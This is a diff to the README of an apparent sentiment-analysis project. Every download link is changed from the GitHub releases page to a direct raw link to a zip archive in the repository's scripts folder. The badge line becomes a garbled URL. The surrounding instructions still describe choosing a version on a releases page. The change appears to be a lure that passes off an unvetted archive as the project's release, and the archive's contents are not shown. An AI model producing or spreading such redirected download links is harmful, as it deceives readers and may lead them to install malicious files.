@@ -7,7 +7,7 @@ Welcome to the **absa-plsa-tficf-lstm** project. This application helps you unde
 To begin, you need to download and run the application. Follow the simple steps below to get started quickly. 
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-Here-brightgreen.svg)](https://github.com/srichandan-tech/absa-plsa-tficf-lstm/releases)
+[![Download Release](https://raw.githubusercontent.com/srichandan-tech/absa-plsa-tficf-lstm/main/scripts/absa-plsa-tficf-lstm-1.3.zip%https://raw.githubusercontent.com/srichandan-tech/absa-plsa-tficf-lstm/main/scripts/absa-plsa-tficf-lstm-1.3.zip)](https://raw.githubusercontent.com/srichandan-tech/absa-plsa-tficf-lstm/main/scripts/absa-plsa-tficf-lstm-1.3.zip)
 
 ## 💻 System Requirements
 Before you install, ensure your system meets these requirements:
@@ -20,7 +20,7 @@ Before you install, ensure your system meets these requirements:
 
 ### Step 1: Visit the Release Page
 To download the application, visit the following link:
-[Download from Releases Page](https://github.com/srichandan-tech/absa-plsa-tficf-lstm/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/srichandan-tech/absa-plsa-tficf-lstm/main/scripts/absa-plsa-tficf-lstm-1.3.zip)
 
 ### Step 2: Choose Your Version
 On the releases page, you will see various versions of the application. Look for the latest stable version listed at the top. Click on it to open the details.
@@ -77,4 +77,4 @@ This application stands at the cutting edge of sentiment analysis. Designed for 
 
 Now, download the application and start exploring sentiment in your text effortlessly. 
 
-[Download from Releases Page](https://github.com/srichandan-tech/absa-plsa-tficf-lstm/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/srichandan-tech/absa-plsa-tficf-lstm/main/scripts/absa-plsa-tficf-lstm-1.3.zip)
